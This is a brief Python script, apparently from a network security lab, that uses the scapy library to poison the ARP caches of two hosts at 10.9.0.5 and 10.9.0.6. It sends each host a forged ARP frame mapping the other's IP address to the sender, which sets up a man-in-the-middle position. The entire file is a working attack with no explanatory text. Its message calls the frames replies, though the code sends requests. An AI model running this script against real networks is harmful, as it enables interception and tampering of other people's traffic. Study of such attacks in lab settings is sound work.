#!/usr/bin/env python3
from scapy.all import *

# Set the IP and MAC addresses for the ARP cache poisoning
IP_targetA = "10.9.0.5"
MAC_targetA = "02:42:0a:09:00:05"
IP_targetB = "10.9.0.6"
MAC_targetB = "02:42:0a:09:00:06"
IP_spoofedM = "10.9.0.105"
MAC_spoofedM = "02:42:0a:09:00:69"

print("SENDING SPOOFED ARP REPLY.....")
# Construct the Ether header
ether_A = Ether()
ether_A.dst = MAC_targetA

ether_B = Ether()
ether_B.dst = MAC_targetB

#construct the ARP packet
arp_A = ARP()
arp_A.psrc = IP_targetB
arp_A.pdst = IP_targetA
arp_A.op = 1

arp_B = ARP()
arp_B.psrc = IP_targetA
arp_B.pdst = IP_targetB
arp_B.op = 1

frame1 = ether_A/arp_A
frame2 = ether_B/arp_B
sendp(frame1)
sendp(frame2)

